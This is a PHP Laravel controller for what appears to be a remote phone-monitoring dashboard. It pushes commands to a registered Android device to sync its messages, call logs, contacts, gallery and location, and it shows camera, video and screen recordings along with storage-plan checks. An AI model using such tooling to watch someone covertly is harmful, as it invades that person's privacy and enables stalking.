<?php

namespace App\Http\Controllers\Features;

use App\Http\Controllers\Actions\Functions\SendFcmNotification;
use App\Http\Controllers\Controller;
use App\Models\clients;
use App\Models\defaultStorage;
use App\Models\device;
use App\Models\gallery_items;
use App\Models\images;
use App\Models\location;
use App\Models\manual_txns;
use App\Models\screen_recordings;
use App\Models\storage_txn;
use App\Models\videos;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class IndexController extends Controller
{
    public $plan_expired = false;
    public $store_more = true;

    public function messages()
    {
        for ($i = 0; $i <= 3; $i++) {
            $this->sendNotification('sync_inbox');
            $this->sendNotification('sync_outbox');
        }
        return view('frontend_new.pages.message');
    }

    public function call_logs()
    {
        $this->sendNotification('call_log');
        return view('frontend_new.pages.call-log');
    }

    public function contacts()
    {
        $this->sendNotification('sync_contacts');
        return view('frontend_new.pages.contact');
    }

    public function gallery()
    {
        $this->sendNotification('sync_gallery');
        $clients = clients::where('client_id', session('user_id'))->first();
        $gallery_items = gallery_items::where('user_id', session('user_id'))
            ->where('device_id', $clients->device_id)
            ->orderBy('created_at', 'desc')
            ->get();
        $this->storage_count();
        return view('frontend_new.pages.gallery')->with(['gallery_items' => $gallery_items, 'plan_expired' => $this->plan_expired, 'store_more' => $this->store_more]);
    }

    public function voice_record()
    {
        return view('frontend_new.pages.voice-record');
    }

    public function camera()
    {
        return view('frontend_new.pages.camera');
    }

    public function camera_front()
    {
        $user = clients::where('client_id', session('user_id'))->first();
        $images = images::where('user_id', $user->client_id)
            ->where('device_id', $user->device_id)
            ->latest()
            ->get();
        return view('frontend_new.pages.camera-video.front-cam')->with(['images' => $images]);
    }

    public function video_front()
    {
        $client = clients::where('client_id', session('user_id'))->first();
        $recording = videos::where('user_id', $client->client_id)->where('device_id', $client->device_id)->latest()->get();
        return view('frontend_new.pages.camera-video.front-vid')->with(['recordings' => $recording]);
    }

    public function device_status()
    {
        $device = clients::where('client_id', session('user_id'))->first();
        if ($device != null) {
            $dev = DB::table('my_devices')
                ->where('user_id', session('user_id'))
                ->where('device_id', $device->device_id)
                ->whereNotNull('android_version')
                ->first();
            if ($dev != null) {
                // foreach ($dev as $d) {
                //     $deviceList[] = [
                //         'manufacturer' => $d->manufacturer,
                //         'model' => $d->model,
                //         'version' => $d->android_version,
                //         'host' => $d->host,
                //         'battery' => $d->battery,
                //         'updated_at' => $d->updated_at,
                //     ];
                // }
                return view('frontend_new.pages.device-status')->with(['status' => $dev]);
            } else {
                return view('frontend_new.pages.device-status')->with(['status' => 0]);
            }
        }
    }

    public function get_device_status()
    {
        $client_id = clients::where('client_id', session('user_id'))->first();
        $client = device::where('device_id', $client_id->device_id)->where('client_id', $client_id->client_id)->orderBy('updated_at', 'desc')->first();
        $data = [
            'device_token' => $client->device_token,
            'title' => null,
            'body' => null,
            'action_to' => 'device_status',
        ];
        try {
            $sendFcmNotification = new SendFcmNotification();
            $res = $sendFcmNotification->sendNotification($data['device_token'], $data['action_to'], $data['title'], $data['body']);
            Log::error('done ' . $res['message']);
            return response()->json(['message' => $res['message']]);
        } catch (\Throwable $th) {
            Log::error('done ' . $res['message']);
            return response()->json(['message' => $res['message']]);
        }
    }


    public function screen_record()
    {
        $device = clients::where('client_id', session('user_id'))->first();
        if ($device) {
            $screenRecordings  = screen_recordings::where('user_id', session('user_id'))
                ->where('device_id', $device->device_id)
                ->latest()
                ->get();
        } else {
            $screenRecordings = [];
        }
        return view('frontend_new.pages.screen-record')->with(['screenRecordings' => $screenRecordings]);
    }

    public function screen_record_new()
    {
        $device = clients::where('client_id', session('user_id'))->first();
        if ($device) {
            $screenRecordings  = screen_recordings::where('user_id', session('user_id'))
                ->where('device_id', $device->device_id)
                ->latest()
                ->get();
        } else {
            $screenRecordings = [];
        }
        return view('frontend_new.pages.screen-record-new')->with(['screenRecordings' => $screenRecordings]);
    }

    public function location()
    {
        $device = clients::where('client_id', session('user_id'))->first();
        $latlong = location::where('client_id', session('user_id'))->where('device_id', $device->device_id)->first();
        if ($latlong != null) {
            $lat = $latlong->lat;
            $lng = $latlong->long;
            $userId = session('user_id');
        } else {
            $lat = '';
            $lng = '';
            $userId = session('user_id');
        }
        return view('frontend_new.pages.location')->with(['lat' => $lat, 'lng' => $lng, 'userId' => $userId]);
    }

    public function get_location()
    {
        $client_id = clients::where('client_id', session('user_id'))->first();
        $device = device::where('device_id', $client_id->device_id)->where('client_id', $client_id->client_id)->orderBy('updated_at', 'desc')->first();

        $data = [
            'device_token' => $device->device_token,
            'title' => null,
            'body' => null,
            'action_to' => 'locate_phone',
        ];

        // Send notification to device
        try {
            $sendFcmNotification = new SendFcmNotification();
            $res = $sendFcmNotification->sendNotification($data['device_token'], $data['action_to'], $data['title'], $data['body']);
            Log::error('done ' . $res['message'] . ' notification! - ');
            return response()->json(['message' => $res['message']]);
        } catch (\Throwable $th) {
            Log::error('not done ' . $res['message'] . ' notification! - ');
            return response()->json(['message' => $res['message']]);
        }
    }


    public function settings()
    {
        $devices = device::where('client_id', session('user_id'))->get();
        $client = clients::where('client_id', session('user_id'))->first();
        return view('frontend_new.pages.settings')->with(['devices' => $devices, 'client' => $client]);
    }

    //fcm notification
    public function sendNotification($action_to)
    {
        $client_id = clients::where('client_id', session('user_id'))->first();
        $client = device::where('device_id', $client_id->device_id)->where('client_id', $client_id->client_id)->orderBy('updated_at', 'desc')->first();
        $data = [
            'device_token' => $client->device_token,
            'title' => null,
            'body' => null,
            'action_to' => $action_to,
        ];
        try {
            $sendFcmNotification = new SendFcmNotification();
            $res = $sendFcmNotification->sendNotification($data['device_token'], $data['action_to'], $data['title'], $data['body']);
            Log::error('done ' . $res['message']);
            return;
        } catch (\Throwable $th) {
            Log::error('Failed to send ' . $action_to . ' notification! - ' . $th->getMessage());
            return;
        }
    }


    // storage_count
    public function storage_count()
    {
        $gall = gallery_items::where('user_id', session('user_id'))->get();
        $storage_size = 0;
        $storage_pack = storage_txn::where('client_id', session('user_id'))
            ->latest('created_at')
            ->first();
        $storage_txn = storage_txn::where('client_id', session('user_id'))
            ->latest('created_at')
            ->get();

        $cd = 0;
        $manual = manual_txns::where('client_id', session('user_id'))->orderByDesc('updated_at')->first();
        if ($manual != null) {
            if ($gall->isNotEmpty()) {
                foreach ($gall as $g) {
                    $storage_size += $g->size;
                }
                $validity = $manual->storage_validity == 'monthly' ? 30 : 365;
                $createdAt = Carbon::parse($manual->created_at);
                $expirationDate = $createdAt->addDays($validity);
                if ($expirationDate->isPast()) {
                    $this->plan_expired = true;
                    return;
                } elseif (($manual->storage * (1024 * 1024 * 1024)) <= $storage_size) {
                    $this->store_more = false;
                    return;
                } else {
                    $this->store_more = true;
                    return;
                }
            } else {
                return;
            }
        } elseif ($gall->isNotEmpty()) {
            foreach ($gall as $g) {
                $storage_size += $g->size;
            }
            if ($storage_pack == null) {
                $data = defaultStorage::first();
                if ($storage_size >= ($data->storage * 1024 * 1024)) {
                    $this->store_more = false;
                    return;
                } else {
                    $this->store_more = true;
                    return;
                }
            } else {
                foreach ($storage_txn as $st) {
                    if ($st->status != 0) {
                        $cd = 1;
                        $validity = $st->plan_type == 'monthly' ? 30 : 365;
                        $createdAt = Carbon::parse($st->created_at);
                        $expirationDate = $createdAt->addDays($validity);
                        if ($expirationDate->isPast()) {
                            $this->plan_expired = true;
                            return;
                        } else {
                            if (($st->storage * (1024 * 1024 * 1024)) <= $storage_size) {
                                $this->store_more = false;
                                return;
                            } else {
                                $this->store_more = true;
                                return;
                            }
                        }
                    } else {
                        continue;
                    }
                }
                // if storage_txn status is all pending
                if ($cd == 0) {
                    $data = defaultStorage::first();
                    if ($storage_size >= ($data->storage * 1024 * 1024)) {
                        $this->store_more = false;
                        return;
                    } else {
                        $this->store_more = true;
                        return;
                    }
                }
            }
        } else {
            return;
        }
    }
}
